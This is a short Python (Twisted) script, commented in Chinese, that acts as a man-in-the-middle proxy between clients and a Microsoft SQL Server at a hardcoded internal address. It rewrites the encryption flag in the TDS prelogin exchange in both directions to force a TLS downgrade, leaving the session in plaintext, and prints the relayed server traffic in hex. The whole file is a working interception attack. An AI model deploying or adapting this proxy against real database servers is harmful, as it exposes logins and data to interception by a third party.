#!/usr/bin/env python

#
# mssql 中间人服务，用来将 mssql 的tls加密通信还原为tcp明文通信
# attacker   -> mitm -> SQL Server
# SQL Server -> mitm -> attacker
#

from twisted.internet import protocol, reactor

LISTEN_PORT = 1433
SERVER_PORT = 1433
SERVER_ADDR = "192.168.40.201"


# Adapted from http://stackoverflow.com/a/15645169/221061
class ServerProtocol(protocol.Protocol):
    def __init__(self):
        self.buffer = None
        self.client = None

    def connectionMade(self):
        factory = protocol.ClientFactory()
        factory.protocol = ClientProtocol
        factory.server = self

        reactor.connectTCP(SERVER_ADDR, SERVER_PORT, factory)

    # Client => Proxy
    def dataReceived(self, data):
        # 这里得先从 mssql 登录里面找到版本号信息那一段hex
        i = data.find(b"\x08\x00\x01\x55\x00\x00\x00\x4d\x53\x53")
        if i > -1:
            print("FOUND: client prelogin")
            # 将hex中的 0x00 替换为了 0x02 这样就不需要进行tls了
            rstr = "\x08\x00\x01\x55\x00\x00\x02\x4d\x53\x53"
            data = data[:i] + rstr.encode('utf-8') + data[i + len(rstr):]

        if self.client:
            self.client.write(data)
        else:
            self.buffer = data

    # Proxy => Client
    def write(self, data):
        self.transport.write(data)


class ClientProtocol(protocol.Protocol):
    def connectionMade(self):
        self.factory.server.client = self
        self.write(self.factory.server.buffer)
        self.factory.server.buffer = ''

    # Server => Proxy
    def dataReceived(self, data):
        print("Server2133122 says:{}".format(data.hex()))
        # 这里是判断中间人的数据是否正常的，要改成和上面的 0x00一致
        if data.endswith(b"\xff\x0e\x00\x03\xe8\x00\x00\x00\x00"):
            data = data[:-2] + b"\x02\x00"
            print("Server says:{}".format(data.hex()))
            print("WOOT! replacement above")

        self.factory.server.write(data)

    # Proxy => Server
    def write(self, data):
        if data:
            self.transport.write(data)


def main():
    factory = protocol.ServerFactory()
    factory.protocol = ServerProtocol

    reactor.listenTCP(LISTEN_PORT, factory)
    reactor.run()


if __name__ == '__main__':
    main()
